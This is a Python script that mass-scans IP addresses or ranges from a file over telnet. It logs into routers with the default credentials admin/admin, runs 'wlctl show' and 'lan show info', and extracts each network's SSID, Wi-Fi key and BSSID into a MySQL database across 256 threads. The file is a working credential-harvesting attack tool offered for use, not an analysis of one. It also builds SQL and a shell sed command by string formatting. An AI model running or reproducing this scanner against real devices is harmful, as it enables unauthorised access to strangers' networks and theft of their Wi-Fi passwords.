#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import os, time, socket
import queue, logging, threading
import netaddr, pymysql, telnetlib


IP_TYPE  = 0    # 0-list, 1-mask, 2-range
TIMEOUT  = 10
MAX_TASK = 256
IP_FILE  = 'ip.txt'
LOG_FILE = 'log.log'
DIR_PATH = os.path.dirname(os.path.realpath(__file__))

ip_queue = queue.Queue()
socket.setdefaulttimeout(TIMEOUT)
logging.basicConfig(filename='{}/{}'.format(DIR_PATH, LOG_FILE), level=logging.NOTSET)

class Database():
    def __init__(self):
        self.conn = pymysql.connect(host='127.0.0.1',
                                    unix_socket='/var/run/mysqld/mysqld.sock',
                                    user='wifi',
                                    passwd='wifi',
                                    db='wifi',
                                    charset='utf8')
        self.cur = self.conn.cursor()

    def query(self, sql):
        try:
            self.cur.execute(sql)
            self.conn.commit()
        except:
            logging.error(sql, exc_info=True)
            self.conn.rollback()
            
    def find(self, sql):
        cur = self.conn.cursor()
        try:
            cur.execute(sql)
            return cur.fetchall()
        except:
             logging.error(sql, exc_info=True)
        
    def __del__(self):
        self.conn.close()
        
        
def escape_string(es_str):
    if not es_str or es_str=='None': 
        return ''
    return pymysql.escape_string(es_str)


def telnet(ip):
    try:
        t = telnetlib.Telnet(ip)
        t.read_until(b'username:')
        t.write(b"admin\n")
        t.read_until(b'password:')
        t.write(b"admin\n")
        t.write(b"wlctl show\n")
        t.write(b"lan show info\n")
        t.read_until(b'SSID')
        res = t.read_very_eager().decode('utf8')
        t.close()
    except:
       res = ''
    
    return res


def get(ip):
    info = telnet(ip)
    
    if not info:
        return
    
    info  = ''.join(info.split())
    
    if 'QSS' in info:
        ssid  = info[1:info.find('QSS')]
    
    if 'Key=' in info and 'cmd' in info:
        pwd = info[info.find('Key=')+4:info.find('cmd')]
        
    if 'MACAddress=' in info and '__' in info:
        bssid = info[info.find('MACAddress=')+11:info.find('__')]

    ssid  = escape_string(ssid) if ssid else ''
    pwd   = escape_string(pwd) if pwd else ''
    bssid = escape_string(bssid) if bssid else ''
    date  = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())

    if ''==ssid or ''==bssid:
        return
    
    db = Database()
    sql = 'Select 1 From `wifi` Where `pwd`="{}" And `bssid`="{}";'
    res = db.find(sql)
    if res is None or len(res)==0:
        sql = ('Insert Into `wifi`(`ip`, `ssid`, `pwd`, `bssid`, `date`) Value '
                    '("{}", "{}", "{}", "{}", "{}");'
                ).format(ip, ssid, pwd, bssid, date)
        db.query(sql)
        

def fetch_worker():
    while not ip_queue.empty():
        get(ip_queue.get())
        
        
def worker(task_list):
    for i in task_list:
        ip_queue.put(i)
        
    threads = []
    for t in range(MAX_TASK):
        t = threading.Thread(target=fetch_worker)
        t.start()
        threads.append(t)
        
    for j in range(MAX_TASK):
        threads[j].join()
    
            
def main():
    
    ip_txt = '{}/{}'.format(DIR_PATH, IP_FILE)
    
    if not os.path.exists(ip_txt):
        logging.debug('No such file {}'.format(ip_txt))
        exit()
    
    with open(ip_txt, 'rt') as f:
        ip_list = [line.strip() for line in f]
              
    if IP_TYPE == 0:
        worker(ip_list)
    else:
        for line in ip_list:
            try:
                if IP_TYPE == 1:
                    task_list = [str(ip) for ip in netaddr.IPNetwork(line)]
                if IP_TYPE == 2:
                    ip_range  = line.split()
                    task_list = [str(ip) for ip in netaddr.IPRange(ip_range[0], ip_range[1])]
            except:
                logging.warn(line)
                continue
    
            worker(task_list)
            os.system('sed -i "/{}/d" {}'.format(line, IP_FILE))
   
    
if __name__=='__main__':
    main()
    